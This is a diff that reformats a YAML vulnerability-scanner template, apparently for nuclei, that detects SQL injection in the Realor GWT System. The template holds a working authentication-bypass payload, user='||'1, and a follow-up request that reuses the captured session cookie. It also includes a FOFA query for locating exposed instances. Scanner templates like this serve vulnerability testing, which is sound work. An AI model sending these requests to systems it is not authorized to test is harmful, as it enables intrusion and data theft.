@@ -1,5 +1,4 @@
 id: realor-gwt-system-sqli
-
 info:
   name: Realor GWT System SQL injection
   author: SleepingBag945
@@ -8,14 +7,30 @@ info:
     Realor GWT System system improperly handles the security of data passed by users, resulting in a SQL injection vulnerability. Remote and unauthorized attackers can use this vulnerability to obtain sensitive information in the database, and can further write webshell backdoors. Access, the attacker can execute arbitrary malicious code on the target server and gain system privileges.
   reference:
     - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/realor-gwt-system-sql-injection.yaml
+  classification:
+    cwe-id:
+      - CWE-89
   metadata:
-    verified: "true"
-    max-request: 2
     fofa-query: app="REALOR-天翼应用虚拟化系统"
+    max-request: 2
+    verified: "true"
   tags: realor,sqli,vuln
-
 http:
-  - raw:
+  - extractors:
+      - group: 1
+        internal: true
+        name: cookie
+        part: header
+        regex:
+          - PHPSESSID=(.*?);
+        type: regex
+    matchers:
+      - condition: and
+        dsl:
+          - contains(body_1,"CustomInfo") && contains(header_1,"PHPSESSID")
+          - contains(body_2,"src=\"custom/")
+        type: dsl
+    raw:
       - |
         GET /AgentBoard.XGI?user='||'1&cmd=UserLogin HTTP/1.1
         Host: {{Hostname}}
@@ -23,19 +38,3 @@ http:
         GET /Board.XGI HTTP/1.1
         Cookie: PHPSESSID={{cookie}}
         Host: {{Hostname}}
-
-    extractors:
-      - type: regex
-        name: cookie
-        internal: true
-        part: header
-        group: 1
-        regex:
-          - 'PHPSESSID=(.*?);'
-    matchers:
-      - type: dsl
-        dsl:
-          - 'contains(body_1,"CustomInfo") && contains(header_1,"PHPSESSID")'
-          - 'contains(body_2,"src=\"custom/")'
-        condition: and
-
